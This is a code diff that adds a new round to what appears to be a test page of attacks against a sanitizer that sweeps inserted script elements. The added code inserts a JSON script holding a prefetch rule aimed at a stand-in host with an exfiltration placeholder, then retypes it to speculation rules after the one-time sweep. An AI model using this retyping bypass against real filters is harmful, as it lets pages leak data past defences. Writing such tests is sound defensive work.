@@ -963,6 +963,20 @@ const SPECULATION_RULES_ATTACK_HTML = `<!doctype html>
           document.body.appendChild(rules);
         } catch (error) {}
 
+        // Round 15. The sweep runs when a node is inserted and never again, and
+        // this is the one entry in \`SELECTOR\` decided by an attribute rather
+        // than a tag name. Appended as data it is swept, kept, and retyped a
+        // tick later — after which nothing looks at it again.
+        try {
+          var later = document.createElement("script");
+          later.setAttribute("type", "application/json");
+          later.textContent = JSON.stringify({
+            prefetch: [{ source: "list", urls: ["https://mutated.leak.example.test/?d=__exfil__"] }]
+          });
+          document.body.appendChild(later);
+          setTimeout(function () { later.setAttribute("type", "speculationrules"); }, 50);
+        } catch (error) {}
+
         setTimeout(function () {
           var found = [];
           var all = document.querySelectorAll("script");
